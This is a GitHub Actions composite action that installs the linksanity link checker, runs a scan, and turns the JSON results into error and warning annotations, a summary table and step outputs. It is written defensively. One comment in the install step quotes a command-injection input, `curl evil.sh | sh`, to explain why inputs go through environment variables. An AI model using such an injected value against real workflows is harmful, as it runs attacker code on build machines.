name: linksanity
description: Scan documentation for broken links with linksanity and fail the job if any are found.
author: ya8282

inputs:
  paths:
    description: Space-separated paths to scan for links.
    required: false
    default: "."
  version:
    # Bump this default whenever a new linksanity release should reach action
    # users: this is the one place that controls what consumers get.
    description: Version of linksanity to install from PyPI, pinned to the release this action is tested against. Pass "" to track the latest release instead (may break if the CLI changes), or an explicit "X.Y.Z" to pin to something else.
    required: false
    default: "0.2.0"
  python-version:
    description: Python version to set up for running linksanity.
    required: false
    default: "3.12"
  check-anchors:
    description: Whether to check in-page anchor links ("true"/"false").
    required: false
    default: "false"
  skip-urls:
    description: Space-separated URL patterns to skip.
    required: false
    default: ""
  output:
    description: Path to write the JSON scan results to.
    required: false
    default: "linkcheck-results.json"
  baseline:
    description: Path to a previous JSON results file; only links that are newly broken relative to it fail the job.
    required: false
    default: ""
  args:
    description: Extra raw arguments passed through to `linksanity scan` as-is.
    required: false
    default: ""
  upload-results:
    description: Whether to upload the scan results file as a workflow artifact ("true"/"false").
    required: false
    default: "true"
  artifact-name:
    description: Name of the workflow artifact to upload the scan results as. Set a distinct value per job when a workflow calls this action more than once, since upload-artifact rejects duplicate names within a run.
    required: false
    default: "linksanity-results"
  browser:
    description: Whether to install the Playwright browser extra, required for --js-domains ("true"/"false"). Adds a Chromium download to the run.
    required: false
    default: "false"
  fail-on-redirect-loop:
    description: "Whether a redirect loop (too_many_redirects) fails the job and is counted in broken-count (\"true\"/\"false\"). When \"false\" it is still surfaced as a ::warning:: instead of being silently dropped."
    required: false
    default: "true"

outputs:
  broken-count:
    description: Number of links found by the scan with a failing status (broken, error, or too_many_redirects — a redirect loop counts as a failure even though it isn't literally "broken").
    value: ${{ steps.scan.outputs.broken-count }}
  results-file:
    description: Path to the JSON results file written by the scan.
    value: ${{ steps.scan.outputs.results-file }}
  annotations:
    description: "The literal ::error:: annotation lines emitted for failing links (empty when there were none), exposed so callers and self-test can assert against the real text instead of reimplementing it."
    value: ${{ steps.scan.outputs.annotations }}
  warnings:
    description: "The literal ::warning:: annotation lines emitted for redirect-loop links when fail-on-redirect-loop is false (empty when there were none), exposed so callers and self-test can assert against the real text instead of reimplementing it."
    value: ${{ steps.scan.outputs.warnings }}

runs:
  using: composite
  steps:
    - name: Set up Python
      uses: actions/setup-python@a309ff8b426b58ec0e2a45f0f869d46889d02405 # v6.2.0
      with:
        python-version: ${{ inputs.python-version }}

    - name: Install linksanity
      shell: bash
      # Inputs go through env, never `${{ }}` interpolation into the script body:
      # a value like `x"; curl evil.sh | sh; :"` would otherwise execute.
      env:
        VERSION: ${{ inputs.version }}
        BROWSER: ${{ inputs.browser }}
      run: |
        if [ "$BROWSER" = "true" ]; then
          if [ -n "$VERSION" ]; then
            pip install "linksanity[browser]==$VERSION"
          else
            pip install "linksanity[browser]"
          fi
          playwright install --with-deps chromium
        else
          if [ -n "$VERSION" ]; then
            pip install "linksanity==$VERSION"
          else
            pip install "linksanity"
          fi
        fi

    - name: Run scan
      id: scan
      shell: bash
      env:
        PATHS: ${{ inputs.paths }}
        CHECK_ANCHORS: ${{ inputs.check-anchors }}
        SKIP_URLS: ${{ inputs.skip-urls }}
        OUTPUT: ${{ inputs.output }}
        BASELINE: ${{ inputs.baseline }}
        EXTRA_ARGS: ${{ inputs.args }}
        BROWSER: ${{ inputs.browser }}
        FAIL_ON_REDIRECT_LOOP: ${{ inputs.fail-on-redirect-loop }}
      run: |
        if [ "$BROWSER" != "true" ]; then
          case "$EXTRA_ARGS" in
            *--js-domains*)
              echo "::error::--js-domains requires Playwright. Set \`browser: true\` on this action to install it."
              exit 1
              ;;
          esac
        fi

        flags=""
        if [ "$CHECK_ANCHORS" = "true" ]; then
          flags="$flags --check-anchors"
        fi
        if [ -n "$SKIP_URLS" ]; then
          skip_file=$(mktemp)
          set -f
          printf '%s\n' $SKIP_URLS > "$skip_file"
          set +f
          flags="$flags --skip-urls $skip_file"
        fi
        if [ -n "$BASELINE" ]; then
          # $BASELINE is deliberately unquoted below (see the note near the
          # scan invocation), so it must not contain whitespace or start with
          # a dash (which would word-split into a flag).
          case "$BASELINE" in
            *[[:space:]]*)
              echo "::error::baseline: '$BASELINE' contains whitespace, which is not allowed since the value is passed unquoted."
              exit 1
              ;;
          esac
          case "$BASELINE" in
            -*)
              echo "::error::baseline: '$BASELINE' starts with '-', which would be parsed as a flag instead of a path."
              exit 1
              ;;
          esac
          if [ ! -f "$BASELINE" ]; then
            echo "::error::baseline: file '$BASELINE' was not found. Check the path passed to the baseline input."
            exit 1
          fi
          flags="$flags --baseline $BASELINE"
        fi

        set +e
        # $PATHS, $flags and $EXTRA_ARGS are deliberately unquoted: all three are
        # space-separated lists that must word-split into separate argv entries.
        linksanity scan $PATHS --format json --output "$OUTPUT" $flags $EXTRA_ARGS
        code=$?
        set -e

        # linksanity writes --output before it writes --report or computes its
        # own exit code, so the results file can exist even when the CLI goes
        # on to fail for an unrelated reason (e.g. --report pointing at an
        # unwritable path). A present file is therefore necessary but not
        # sufficient to trust jq's output or override the CLI's exit code --
        # see the jq_ok handling below and the exit-code contract comment near
        # the bottom of this step.
        #
        # What counts as a failure here must track linksanity/queue.py's
        # FAILING_STATUSES: broken, error, and too_many_redirects (a redirect
        # loop never resolved, so it's unusable exactly like broken/error, even
        # though the CLI's exit code and a human-facing "broken" label treat it
        # separately). Single-sourced as FAILING_STATUSES_JSON below so the
        # count, the ::error:: annotations, and the summary table can never
        # drift from each other again (linksanity-jx1). The fail-on-redirect-loop
        # input lets a caller opt too_many_redirects out of that set entirely
        # (linksanity-9tw); it is still surfaced, just as ::warning:: instead
        # of ::error::, in the block below.
        if [ "$FAIL_ON_REDIRECT_LOOP" = "false" ]; then
          FAILING_STATUSES_JSON='["broken","error"]'
        else
          FAILING_STATUSES_JSON='["broken","error","too_many_redirects"]'
        fi

        broken_count=0
        jq_ok=false
        redirect_warnings=""
        if [ -f "$OUTPUT" ]; then
          # Capture jq's own exit status (via the `if` condition, which is
          # exempt from `set -e`) rather than folding a parse failure into
          # `|| echo 0`: that older form made "jq parsed the file and found 0"
          # indistinguishable from "jq failed to parse the file at all", which
          # let the exit-code override below fire on an unusable results file
          # and silently turn a genuine CLI failure into success (linksanity-9tw).
          #
          # A genuinely empty (0-byte) results file is a second, quieter
          # variant of the same problem: jq treats an empty input stream as
          # zero JSON values to filter, so it exits 0 and prints nothing --
          # no error to catch, just an empty $broken_count -- rather than
          # failing outright the way truncated/malformed JSON does. Reject
          # that case explicitly by requiring the captured value to actually
          # be a non-negative integer.
          if broken_count=$(jq --argjson failing_statuses "$FAILING_STATUSES_JSON" '[.[] | select(.status as $s | $failing_statuses | index($s) != null)] | length' "$OUTPUT" 2>/dev/null); then
            case "$broken_count" in
              ''|*[!0-9]*)
                jq_ok=false
                ;;
              *)
                jq_ok=true
                ;;
            esac
          else
            jq_ok=false
          fi
          if [ "$jq_ok" = false ]; then
            broken_count=0
            echo "::error::linksanity wrote $OUTPUT but it could not be parsed as the expected JSON array of scan results (empty file, truncated JSON, or valid JSON that isn't a list). This action's pass/fail policy cannot be evaluated against unusable results, so the scan's own exit code ($code) is being propagated as-is. Check the scan step log above and the uploaded artifact for $OUTPUT."
          fi

          if [ "$FAIL_ON_REDIRECT_LOOP" = "false" ]; then
            # too_many_redirects was excluded from FAILING_STATUSES_JSON above,
            # so it's neither counted nor ::error::-annotated below; emit a
            # ::warning:: per redirect-loop link instead so it's never silently
            # dropped (linksanity-9tw). No existing warning path covers this
            # (the only other ::warning:: here is for a missing results file
            # entirely), so this is a new, narrower jq pass.
            redirect_warnings=$(jq -r '
              .[]
              | select(.status == "too_many_redirects")
              | . as $r
              | ($r.source_file // "" | gsub("[\r\n]+"; " ")) as $source
              | ($r.url // "" | gsub("[\r\n]+"; " ")) as $url
              | (if $r.http_code != null then ($r.http_code|tostring) elif $r.error != null then ($r.error|tostring) else "" end | gsub("[\r\n]+"; " ")) as $detail
              | ($source | gsub(","; "_") | gsub("::"; ":")) as $file_attr
              | (if $r.line == null then "" else ",line=" + ($r.line|tostring) end) as $lineattr
              | "::warning file=" + $file_attr + $lineattr + "::" + $url + " — redirect loop" + (if $detail == "" then "" else " " + $detail end)
            ' "$OUTPUT") || true
            if [ -n "$redirect_warnings" ]; then
              printf '%s\n' "$redirect_warnings"
            fi
          fi

          if [ "$broken_count" -gt 0 ]; then
            # Emit one GitHub Actions error annotation per failing link so the
            # failure is visible in the raw log without downloading the
            # uploaded artifact. Build the fully-formed annotation line in
            # jq itself (not by interpolating fields into the shell) since
            # urls/errors can contain characters meaningful to bash.
            # .error (and, more rarely, .url/.source_file) can be arbitrary
            # third-party text -- e.g. a Playwright exception string -- and
            # may contain embedded CR/LF. Left unsanitized, jq -r would emit
            # that newline literally and `while read` would split it into a
            # second "line" that GitHub parses as its own, attacker-controlled
            # ::error:: annotation. Collapse CR/LF to a space before use. The
            # file= property is further restricted (no "," or "::") since
            # those characters would corrupt GitHub's file=/line= parsing.
            # Captured into a variable (rather than piped straight to stdout)
            # so the exact same text can also be exposed as the `annotations`
            # output below -- the annotation output step must always print the
            # literal text it exposes, not a second reimplementation of it.
            annotations=$(jq -r --argjson failing_statuses "$FAILING_STATUSES_JSON" '
              .[]
              | select(.status as $s | $failing_statuses | index($s) != null)
              | . as $r
              | ($r.source_file // "" | gsub("[\r\n]+"; " ")) as $source
              | ($r.url // "" | gsub("[\r\n]+"; " ")) as $url
              | (if $r.http_code != null then ($r.http_code|tostring) elif $r.error != null then ($r.error|tostring) else "" end | gsub("[\r\n]+"; " ")) as $detail
              | ($source | gsub(","; "_") | gsub("::"; ":")) as $file_attr
              | (if $r.line == null then "" else ",line=" + ($r.line|tostring) end) as $lineattr
              | (if $r.status == "too_many_redirects" then "redirect loop" else ($r.status // "") end) as $status_label
              | "::error file=" + $file_attr + $lineattr + "::" + $url + " — " + $status_label + (if $detail == "" then "" else " " + $detail end)
            ' "$OUTPUT") || true
            printf '%s\n' "$annotations"

            delim=$(openssl rand -hex 16)
            {
              echo "annotations<<$delim"
              printf '%s\n' "$annotations"
              echo "$delim"
            } >> "$GITHUB_OUTPUT"

            if [ -n "$GITHUB_STEP_SUMMARY" ]; then
              {
                echo "### $broken_count failing link(s) found"
                echo ""
                echo "| Source | Line | URL | Status | Detail |"
                echo "| --- | --- | --- | --- | --- |"
                jq -r --argjson failing_statuses "$FAILING_STATUSES_JSON" '
                  .[]
                  | select(.status as $s | $failing_statuses | index($s) != null)
                  | . as $r
                  | ($r.source_file // "" | gsub("[\r\n]+"; " ")) as $source
                  | ($r.url // "" | gsub("[\r\n]+"; " ")) as $url
                  | (if $r.line == null then "" else ($r.line|tostring) end) as $lineval
                  | (if $r.http_code != null then ($r.http_code|tostring) elif $r.error != null then ($r.error|tostring) else "" end | gsub("[\r\n]+"; " ")) as $detail
                  | "| " + ($source | gsub("\\|"; "\\|")) + " | " + $lineval + " | " + ($url | gsub("\\|"; "\\|")) + " | " + ($r.status // "") + " | " + ($detail | gsub("\\|"; "\\|")) + " |"
                ' "$OUTPUT"
              } >> "$GITHUB_STEP_SUMMARY" || true
            fi
          fi
        else
          echo "::warning::linksanity exited $code without writing $OUTPUT; reporting broken-count=0. Check the scan step log above for the underlying error."
        fi

        # Written unconditionally (empty when there were no redirect-loop
        # warnings), mirroring the `annotations` output above, so callers and
        # self-test can assert against the real ::warning:: text instead of
        # reimplementing it -- and so a self-test can fail if this jq pass is
        # ever deleted (linksanity-rqd). Must not disturb `annotations` itself:
        # that output is still written only inside the broken_count > 0
        # branch above, and its emptiness in the fail-on-redirect-loop=false
        # case is unchanged by this.
        warn_delim=$(openssl rand -hex 16)
        {
          echo "warnings<<$warn_delim"
          printf '%s\n' "$redirect_warnings"
          echo "$warn_delim"
        } >> "$GITHUB_OUTPUT"

        echo "broken-count=$broken_count" >> "$GITHUB_OUTPUT"
        echo "results-file=$OUTPUT" >> "$GITHUB_OUTPUT"

        # Pinned linksanity==0.2.0's own contract (verified empirically against
        # cli.py, not assumed): scan() raises typer.Exit(1 if broken else 0)
        # only after it has written --output and --report, where "broken"
        # counts only BROKEN/ERROR statuses (never too_many_redirects). One
        # exception to treating 1 as a link-status verdict: --github-issue
        # without GITHUB_TOKEN raises an unhandled RuntimeError, which Python
        # exits 1 for. That reporter returns early when nothing is broken, so
        # such a run always has at least one BROKEN/ERROR link and fails under
        # either policy anyway. Every other exit
        # code (2, observed for both a rejected flag and a failed --report
        # write) is an operational failure raised via typer.Exit(2), and can
        # occur even after the results file was written successfully (e.g.
        # --report pointing at an unwritable path fails *after* --output is
        # written), so a present results file alone does NOT mean the CLI's
        # exit code is about link statuses.
        #
        # This action's own policy (fail-on-redirect-loop plus the other
        # FAILING_STATUSES) may only supersede the CLI's exit code when both:
        # (a) the CLI's code is one this action's policy actually owns (0 or
        # 1), and (b) jq successfully parsed the results file, so broken_count
        # is a real count and not a parse failure masquerading as zero. If
        # either condition fails, the CLI's own exit code is propagated
        # verbatim instead -- this is what keeps an unwritable --report path,
        # an unparseable results file, or a future non-0/1/2 code from being
        # silently downgraded to success (linksanity-9tw).
        if [ -f "$OUTPUT" ] && [ "$jq_ok" = true ] && { [ "$code" -eq 0 ] || [ "$code" -eq 1 ]; }; then
          if [ "$broken_count" -gt 0 ]; then
            exit 1
          fi
          exit 0
        fi
        exit $code

    - name: Upload scan results
      if: always() && inputs.upload-results == 'true'
      uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
      with:
        name: ${{ inputs.artifact-name }}
        path: ${{ inputs.output }}

branding:
  icon: link
  color: purple
